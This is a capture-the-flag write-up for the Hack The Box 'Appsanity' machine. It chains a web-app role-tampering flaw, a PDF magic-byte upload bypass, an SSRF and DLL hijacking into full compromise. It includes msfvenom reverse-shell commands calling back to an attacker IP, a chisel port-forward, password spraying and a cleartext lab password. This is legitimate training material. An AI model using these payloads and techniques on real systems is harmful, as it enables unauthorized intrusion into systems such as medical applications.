# HTB - Appsanity

### TL;DR
This is a Windows 10 machine running a medical web application. Manipulating http requests we can get privileged access in the application and upload a malicious .aspx shell. To execute the shell, as ssrf attack is used. To escalate privileges, port forwarding and reversing of a local service are used.<br>

**Keywords:**<br>
file upload, ssrf, reversing, port forwarding
### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-31 10:08 EDT
Nmap scan report for 10.129.190.19
Host is up, received user-set (0.067s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
443/tcp  open  https   syn-ack
5985/tcp open  wsman   syn-ack

Nmap done: 1 IP address (1 host up) scanned in 95.04 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p80,443,5985 -sV -sC -Pn -vv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-31 10:12 EDT
Nmap scan report for meddigi.htb (10.129.190.19)
Host is up, received user-set (0.066s latency).
Scanned at 2023-10-31 10:12:17 EDT for 22s

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp  open  https?  syn-ack
5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 22.76 seconds
```
Discover hidden subdomains with `ffuf`
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fc 404 -t 100 -u https://meddigi.htb -H "Host: FUZZ.meddigi.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://meddigi.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.meddigi.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

portal                  [Status: 200, Size: 2976, Words: 1219, Lines: 57, Duration: 3394ms]
:: Progress: [4989/4989] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```
Add this subdomain to hosts file and browse with firefox.

![appsanity1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/e5e6ec35-40bf-435f-bfc7-48745684bec8)

Also, we notice we cannot access the http 80 service externally. Take note of this because this service can maybe be accessed internally later if we find a place to launch a ssrf attack.

### PHASE 2: User
Sign up to the site and create a new account and intercept the request. You can see there is a parameter called `AccType` set to "1". Manipulate it with burpsuite and set it to "2", forward the request until it completes successfully. Finally, log in using the recently created account and verify we have made ourselves a doctor account.

![appsanity2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/7fc79012-2a44-40fc-a7c3-5dd276e0d5fc)

We also notice we have been granted an access token in the cookie editor.

![appsanity3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/71cd2245-f553-463c-969f-1bea750b9c14)

We can reuse this token to get access to the meddigi portal reserved for doctors. Just browse the site `https://portal.meddigi.htb`, fill in the email id with the one you chose when signing up and save the access_token with the cookie editor.

![appsanity4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b1e5caa0-50e4-44b0-bf28-b1cbc320e350)

Click on `login` and you are inside the doctors panel.

![appsanity5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/fd8eaf13-087b-44dd-b444-9bb89388f4a4)

Move to the "upload report" tab. If you try to upload a shell, there is an extension filter ongoing which only accepts pdf files. Experimenting with the filter, we find out the back end only checks the file magic bytes,  and it does not check file extensions. Prepare a msfvenom `aspx` shell.
```markdown
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.xxx.xxx lport=1919 -f aspx -a x64 --platform windows
```
To upload the shell, navigate to the "upload/report" site.

![appsanity6](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/fa010592-1853-4b3e-86bf-1b8d4f49c2c6)

Upload any pdf you chose and intercept the request, keep the pdf magic bytes and remove the rest. Copy the msfvenom shell and change the filename and set an aspx extension, forward the request and let the upload finish.

![appsanity7](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/3fabf175-e43d-4b60-ba0b-accc3924d0b6)

To execute the shell, navigate to the "issue prescriptions" site, in the prescription link try an ssrf attack. Enter the url `http://127.0.0.1:8080` to view the medical reports, in the output you can view the path of the uploaded reports. 
```markdown
.../ViewReport.aspx?file=f6673d08-592a-44a3-a863-da678b74e0b4_document.aspx
```
To execute the aspx shell, use the ssrf vulnerability pointing to the uploaded shell.
```markdown
http://127.0.0.1:8080/ViewReport.aspx?file=f6673d08-592a-44a3-a863-da678b74e0b4_document.aspx
```
A reverse shell is received.

![appsanity8](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/e63f7d1e-58cb-4d47-bcd0-45ae87945d3d)

Using this reverse shell we can get the user flag.

### PHASE 3: System
Enumerate the user.
```markdown
> whoami
appsanity\svc_exampanel
```
Enumerate the system.
```markdown
> systeminfo
Host Name:                 APPSANITY
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
System Type:               x64-based PC
```
Enumerate the system local users.
```markdown
> net user
User accounts for \\APPSANITY

-------------------------------------------------------------------------------
Administrator            DefaultAccount           devdoc                   
Guest                    svc_exampanel            svc_meddigi              
svc_meddigiportal        WDAGUtilityAccount       
The command completed successfully.
```
Rremember there was a 5985 service open, check who is using it.
```markdown
> net localgroup "remote management users"

Alias name     remote management users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members
-------------------------------------------------------------------------------
devdoc

The command completed successfully.
```
It seems our next goal is to move laterally to user devdoc to gain winrm remote access.
After largely enumerating the file system, we find this dll:
```markdwon
c:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll
```
This can be decompiled with dnspy, where we find several calls to a registry key `software\meddigi`

![appsanity9](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8543a22f-208d-49cd-a1ec-11fe4ef65bb4)

Next step is to query the register. You can find a password in key HKEY_LOCAL_MACHINE\software\meddigi. The password is `1g0tTh3R3m3dy!!`

![appsanity10](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b4918add-8efe-4b55-9c1d-d3413958529d)

If you spray the password with crackmapexec you find the credentials work for user `devdoc:1g0tTh3R3m3dy!!`. Use the local users list we have previously enumerated.
```markdown
evil-winrm -u devdoc -p '1g0tTh3R3m3dy!!' -i meddigi.htb
```
Turns out that under this user's context we can browse this folder.
```markdown
c:\program files\reportmanagement
```
Where we find the file `reportmanagement.exe`. Reversing the binary with ghidra, we find out it uses dll files placed in the "libraries" folder.

![appsanity11](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8b48711c-ba60-4fbf-a1e9-321520ec5b1e)

 So our next step is to place a malicious dll in that folder. This payload can be generated with `msfvenom`
```markdown
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.xxx.xxx lport=9001 -f dll -a x64 --platform windows > externalupload.dll
```
Investigating how to launch the process, we discover the it is internally running on port 100.
```markdown
> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:100            0.0.0.0:0              LISTENING       4432
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       1196
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4
```
To forward this port to our attacking machine we use chisel.
```markdown
> ./chisel64 server -p 8000 --reverse
> .\chisel64.exe client 10.10.xxx.xxx:8000 R:100:127.0.0.1:100
```
![appsanity12](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/c159af4d-a929-479f-96a2-e7a985021e82)

In order to trigger the reverse shell, just execute the "upload" feature in the running port. The application calls the malicious dll and the shell is received.

![appsanity13](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/aa441c3b-413a-45f3-a7dc-f0ad841d5419)
